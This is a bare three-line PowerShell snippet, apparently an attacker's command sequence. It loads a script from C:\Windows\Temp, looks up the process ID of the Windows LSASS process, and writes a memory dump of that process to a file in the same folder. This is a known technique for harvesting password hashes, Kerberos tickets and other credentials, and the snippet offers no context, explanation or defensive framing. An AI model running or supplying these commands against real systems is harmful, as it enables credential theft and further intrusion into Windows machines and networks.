Import-Module C:\Windows\Temp\1234.ps1
$lsass = Get-Process lsass | select -expand id
Get-ProcessMiniDump $lsass -Path C:\Windows\Temp\lsass.dmp